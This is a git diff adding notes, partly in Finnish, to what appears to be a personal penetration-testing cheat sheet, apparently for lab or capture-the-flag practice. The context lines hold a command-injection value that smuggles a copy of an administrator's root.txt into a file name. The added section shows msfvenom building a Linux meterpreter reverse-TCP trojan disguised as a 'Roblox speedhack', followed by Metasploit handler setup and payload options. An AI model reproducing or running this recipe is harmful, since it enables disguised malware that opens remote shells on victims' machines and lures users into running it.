@@ -84,3 +84,93 @@ Mode                LastWriteTime         Length Name
 ##oikee syntaksi
 asd.txt; copy-item -file c:\administrator\Desktop\root.txt | -Destination  c:\users\inetpub\123123.txt -Recurse
 
+
+
+#MSFVENOM
+
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o ROBLOXSPEEDHACKTROJAN.elf
+
+msf5 > use exploit/multi/handler 
+
+msf5 > search multi/handler
+
+Matching Modules
+================
+
+   Name                                               Disclosure Date  Rank       Check  Description
+   ----                                               ---------------  ----       -----  -----------
+   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   exploit/linux/local/desktop_privilege_escalation   2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   exploit/multi/handler                                               manual     No     Generic Payload Handler
+   exploit/windows/browser/persits_xupload_traversal  2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   exploit/windows/mssql/mssql_linkcrawler            2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+
+
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > search linux/x64/
+
+Matching Modules
+================
+
+   Name                                          Disclosure Date  Rank    Check  Description
+   ----                                          ---------------  ----    -----  -----------
+   payload/linux/x64/exec                                         normal  No     Linux Execute Command
+   payload/linux/x64/meterpreter/bind_tcp                         normal  No     Linux Mettle x64, Bind TCP Stager
+   payload/linux/x64/meterpreter/reverse_tcp                      normal  No     Linux Mettle x64, Reverse TCP Stager
+   payload/linux/x64/meterpreter_reverse_http                     normal  No     Linux Meterpreter, Reverse HTTP Inline
+   payload/linux/x64/meterpreter_reverse_https                    normal  No     Linux Meterpreter, Reverse HTTPS Inline
+   payload/linux/x64/meterpreter_reverse_tcp                      normal  No     Linux Meterpreter, Reverse TCP Inline
+   payload/linux/x64/shell/bind_tcp                               normal  No     Linux Command Shell, Bind TCP Stager
+   payload/linux/x64/shell/reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Stager
+   payload/linux/x64/shell_bind_tcp                               normal  No     Linux Command Shell, Bind TCP Inline
+   payload/linux/x64/shell_bind_tcp_random_port                   normal  No     Linux Command Shell, Bind TCP Random Port Inline
+   payload/linux/x64/shell_find_port                              normal  No     Linux Command Shell, Find Port Inline
+   payload/linux/x64/shell_reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Inline
+
+
+msf5 exploit(multi/handler) > use payload/linux/x64/meterpreter_reverse_tcp
+
+#SET PAYLOAD LOL
+
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
+payload => linux/x64/meterpreter_reverse_tcp
+
+LHOST JA PORT KUNTOON JA EXPLOIT
+
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x64/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
